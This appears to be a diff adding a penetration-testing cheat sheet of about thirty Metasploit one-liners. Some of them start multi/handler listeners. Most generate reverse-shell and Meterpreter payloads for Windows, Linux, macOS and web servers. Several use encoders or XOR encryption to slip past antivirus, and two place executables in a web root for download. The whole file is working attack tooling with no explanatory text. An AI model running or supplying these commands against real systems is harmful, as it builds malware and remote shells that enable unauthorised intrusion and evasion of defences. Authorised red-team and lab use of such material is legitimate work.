@@ -1,0 +1,30 @@
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
+msfvenom --list payloads
+msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl
+msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vbapplication
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o <dll|output.dll>
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
